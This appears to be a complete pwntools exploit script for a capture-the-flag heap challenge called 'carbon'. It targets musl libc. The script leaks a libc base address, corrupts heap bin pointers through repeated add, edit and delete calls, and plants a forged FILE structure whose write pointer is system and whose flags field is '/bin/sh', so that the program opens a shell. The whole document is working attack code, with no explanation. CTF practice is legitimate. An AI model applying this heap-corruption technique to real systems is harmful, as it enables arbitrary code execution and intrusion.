from pwn import*
context(os = "linux", arch = 'amd64', log_level = 'debug')

s = process('./carbon')
elf = ELF('./carbon')
libc = ELF("./libc.so")

def add(size,content,ans='N'):
	s.sendlineafter(b'> ', b'1')
	s.sendlineafter(b'What is your prefer size? >', str(size))
	s.sendlineafter(b'Are you a believer? >', ans)
	s.sendafter(b'Say hello to your new sleeve >', content)

def delete(index):
	s.sendlineafter(b'> ', b'2')
	s.sendlineafter(b'What is your sleeve ID? >', str(index))

def edit(index,content):
	s.sendlineafter(b'> ', b'3')
	s.sendlineafter(b'What is your sleeve ID? >', str(index))
	s.send(content)

def show(index):
	s.sendlineafter(b'> ', b'4')
	s.sendlineafter(b'What is your sleeve ID? >', str(index))

add(0, b'') # 0
show(0)
libc_base = u64(s.recv(6).ljust(8,b'\x00')) - 0xa0a80 - 912
success('[+] libc_base=> '+hex(libc_base))

system_addr = libc_base + 0x46bda
stdin_addr = libc_base + 0xa01c0
mal = libc_base + 0xa0a80
brk = libc_base + 0xa2ff0


add(0x10, b'\n') # 1
add(0x10, b'\n') # 2
add(0x10, b'\n') # 3
add(0x10, b'\n') # 4
add(0x10, b'\n') # 5
add(0x10, b'\n') # 6


delete(0)
delete(2)

payload = b'a'*0x10             # 0
payload+= p64(0x21) + p64(0x21) # 1
payload+= b'a'*0x10
payload+= p64(0x21) + p64(0x20) # 2
payload+= p64(stdin_addr - 0x10)*2
payload+= p8(0x20) + b'\n'

add(0x10, payload, b'Y')        # 0
add(0x10, b'\n')                # 2 unbin
delete(1)

edit(2, p64(mal-0x20)*2)
add(0x10, b'\n')                # 1 unbin
delete(3)

edit(2, p64(brk-0x10)*2)
add(0x10, b'\n')                # 3 unbin
delete(5)

bin37_head_addr = mal + 904
edit(2, p64(bin37_head_addr - 0x18)+p64(stdin_addr - 0x10))
add(0x10, b'\n') # 5

fake_IO = b'/bin/sh\x00'        # flags
fake_IO+= b'\x00'*0x20
fake_IO+= p64(1)                # wpos
fake_IO+= b'\x00'*0x8
fake_IO+= p64(2)                # wbase
fake_IO+= b'\x00'*0x8
fake_IO+= p64(system_addr)      # write


'''
struct _IO_FILE {
    unsigned int flags;
    unsigned char *rpos;
    unsigned char *rend;
    int (*close)(FILE *);
    unsigned char *wend;
    unsigned char *wpos;
    unsigned char *mustbezero_1;
    unsigned char *wbase;
    size_t (*read)(FILE *, unsigned char *, size_t);
    size_t (*write)(FILE *, const unsigned char *, size_t);
    off_t (*seek)(FILE *, off_t, int);
    unsigned char *buf;
    size_t buf_size;
    FILE *prev;
    FILE *next;
    int fd;
    int pipe_pid;
    long lockcount;
    int mode;
    volatile int lock;
    int lbf;
    void *cookie;
    off_t off;
    char *getln_buf;
    void *mustbezero_2;
    unsigned char *shend;
    off_t shlim;
    off_t shcnt;
    FILE *prev_locked;
    FILE *next_locked;
    __locale_struct *locale;
} * const
'''

add(0x50, fake_IO)              # 7

edit(2, p64(bin37_head_addr - 0x18)+p64(brk - 0x10))
add(0x10, b'\n')                # 8
add(0x50, p64(0xBADBEEF - 0x20) + b'\n') # 9

edit(2, p64(bin37_head_addr - 0x18)+p64(mal - 0x20))
add(0x10, b'\n')                # 10
add(0x20, b'a'*0x10 + p64(0)*2)

gdb.attach(s)
s.interactive()
